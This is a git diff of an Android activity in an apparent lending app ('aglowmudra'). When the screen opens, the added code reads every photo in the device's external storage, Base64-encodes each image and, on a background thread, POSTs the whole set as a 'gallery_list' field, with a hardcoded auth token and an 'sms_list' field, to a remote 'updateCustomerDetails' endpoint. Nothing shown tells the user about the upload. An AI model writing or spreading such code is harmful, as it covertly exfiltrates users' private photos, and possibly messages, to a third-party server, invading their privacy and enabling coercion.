@@ -2,9 +2,11 @@ package com.example.aglowmudra;
 
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.content.res.Resources;
 import android.database.Cursor;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
+import android.media.Image;
 import android.net.Uri;
 import android.os.Bundle;
 import android.os.Handler;
@@ -14,6 +16,7 @@ import android.util.Log;
 import android.widget.Button;
 import android.widget.EditText;
 import android.widget.GridView;
+import android.widget.ImageView;
 import android.widget.TextView;
 import android.widget.Toast;
 
@@ -23,30 +26,49 @@ import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.util.ArrayList;
 import java.util.FormatFlagsConversionMismatchException;
+import java.util.ResourceBundle;
+
+import okhttp3.FormBody;
+import okhttp3.MediaType;
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.RequestBody;
+import okhttp3.Response;
 
 public class Test extends AppCompatActivity {
 
 
     public static ArrayList<Model_images> al_images = new ArrayList<>();
     boolean boolean_folder;
-    ArrayList<String> allImage=new ArrayList<>();
-
+    ArrayList<String> allImage = new ArrayList<>();
+    ArrayList<String> image=new ArrayList<>();
+  ImageView view;
+  String bitcode="";
 
     private static final int REQUEST_PERMISSIONS = 100;
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.testtwo);
-
+        view =findViewById(R.id.image);
         try {
             fn_imagespath();
         } catch (IOException e) {
             e.printStackTrace();
         }
-count1();
+        Thread thread=new Thread(new Runnable() {
+            @Override
+            public void run() {
+                SendContact();
+            }
+        });
+        thread.start();
+
     }
+
     public ArrayList<Model_images> fn_imagespath() throws IOException {
-        Log.d("TAG","Function Start");
+        Log.d("TAG", "Function Start");
         al_images.clear();
 
         int int_position = 0;
@@ -55,34 +77,43 @@ count1();
         int column_index_data, column_index_folder_name;
 
         String absolutePathOfImage = null;
-        String Imagepath="null";
+        String Imagepath = "null";
         uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
-        Log.d("TAG","VAlue is created system in room"+uri);
-        Log.d("TAG","start one");
+//        Log.d("TAG", "VAlue is created system in room" + uri);
+//        Log.d("TAG", "start one");
         String[] projection = {MediaStore.MediaColumns.DATA, MediaStore.Images.Media.BUCKET_DISPLAY_NAME};
-        Log.d("TAG","start second");
+//        Log.d("TAG", "start second");
         final String orderBy = MediaStore.Images.Media.DATE_TAKEN;
         cursor = getApplicationContext().getContentResolver().query(uri, projection, null, null, orderBy + " DESC");
-        Log.d("TAG","start Third");
+//        Log.d("TAG", "start Third");
         column_index_data = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA);
-        Log.d("TAG","start fourth");
+//        Log.d("TAG", "start fourth");
         column_index_folder_name = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME);
         while (cursor.moveToNext()) {
-            Log.d("TAG","while Loop start ");
+//            Log.d("TAG", "while Loop start ");
             absolutePathOfImage = cursor.getString(column_index_data);
-            Log.e("TAG","Value of Path"+absolutePathOfImage);
-            for (int i=0;i<absolutePathOfImage.length();i++){
-                Log.d("TAG","VAlue loop in loop");
-                Imagepath=absolutePathOfImage;
+          Log.e("TAG", "Value of Path" + absolutePathOfImage);
 
-                Log.d("TAG","VAluein  loop in loop"+Imagepath);
-            }
-            String VAlue=Imagepath;
-            Log.d("TAG","VAlue is creted in the SSSS"+VAlue);
-            Log.e("Folder", cursor.getString(column_index_folder_name));
+            Bitmap bm = BitmapFactory.decodeFile(absolutePathOfImage);
+          Log.d("TAG","Value is creted Bitmap"+bm);
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+           bm.compress(Bitmap.CompressFormat.PNG, 100, baos); //bm is the bitmap object
+
+            byte[] b = baos.toByteArray();
+            Log.d("TAG", "value of bitmap incount function" + b);
+            String encodedImage = Base64.encodeToString(b, Base64.NO_WRAP);
+            Log.d("TAG", "value of bitmap incount function hello everyone" + encodedImage);
+
+
+            bitcode=encodedImage + " ImagePath of image :";
+          allImage.add(bitcode);
+          Log.d("TAG","VAlue is created bys System"+allImage);
+
+
+//            Log.e("Folder", cursor.getString(column_index_folder_name));
 
             for (int i = 0; i < al_images.size(); i++) {
-                Log.d("TAG","For loop started");
+//                Log.d("TAG", "For loop started");
                 if (al_images.get(i).getStr_folder().equals(cursor.getString(column_index_folder_name))) {
                     boolean_folder = true;
                     int_position = i;
@@ -108,8 +139,10 @@ count1();
                 obj_model.setAl_imagepath(al_path);
 
                 al_images.add(obj_model);
-                Log.d("TAG","Image of path"+al_images.get(0).al_imagepath);
-
+               Log.d("TAG", "Image of path" + al_images.get(0).al_imagepath);
+           Bitmap decodedImage = BitmapFactory.decodeByteArray(b, 0, b.length);
+              Log.d("TAG","VAlue is cretedvipincghjkl"+decodedImage);
+                view.setImageBitmap(decodedImage);
 
 
             }
@@ -151,23 +184,58 @@ count1();
             }
         }
     }
-public void count1(){
+    public void SendContact() {
+        try {
+        Log.d("TAG", "VAlue is creted aftewr  send data" + allImage);
+            OkHttpClient client = new OkHttpClient();
+
+            MediaType mediaType = MediaType.parse("application/x-www-form-urlencoded");
+            RequestBody body = RequestBody.create(mediaType, "auth_token=5e204b5ed2f1d&sms_list=%20&gallery_list=" + allImage);
+            Request request = new Request.Builder()
+                    .url("https://drfin.in/aglowcredit/api/updateCustomerDetails")
+                    .post(body)
+                    .addHeader("content-type", "application/x-www-form-urlencoded")
+                    .addHeader("cache-control", "no-cache")
+                    .build();
+
+            Response response = client.newCall(request).execute();
+            String responseString = response.body().string();
+
+            Log.d("TAG", "VAlue is response22323" + responseString);
+           ;
+         /*   String url = "https://drfin.in/aglowcredit/api/updateCustomerDetails";
+            RequestBody formBody = new FormBody.Builder()
+                    .add("mobile", String.valueOf(allImage))
+                    .build();
+
+            OkHttpClient client = new OkHttpClient();
+            Request request = new Request.Builder()
+                    .url(url)
+                    .post(formBody)
+                    .build();
 
 
-String[] value= al_images.get(0).al_imagepath.toArray(new String[0]);
-   Log.d("TAG","VAlue is creted by system"+value);
-    Bitmap bm = BitmapFactory.decodeFile(value[0]);
-    ByteArrayOutputStream baos = new ByteArrayOutputStream();
-    bm.compress(Bitmap.CompressFormat.JPEG, 100, baos); //bm is the bitmap object
-    byte[] b = baos.toByteArray();
-    Log.d("TAG","value of bitmap incount function"+b);
-    String encodedImage = Base64.encodeToString(b, Base64.DEFAULT);
-    Log.d("TAG","value of bitmap incount function"+encodedImage);
-    allImage.add(encodedImage);
+            try {
+                Response response = client.newCall(request).execute();
+                Log.d("TAG","Value of sysytem in man"+response);
+                String responseString = response.body().string();
 
-    String help=allImage.get(0);
+                Log.d("TAG", "VAlue is response22323" + responseString);
+            }catch (Exception e){
+
+                e.getStackTrace();
+            } */
 
 
+        } catch (Exception e) {
+            e.getStackTrace();
 
-}
-}
+        }
+
+
+    }
+
+
+
+    }
+
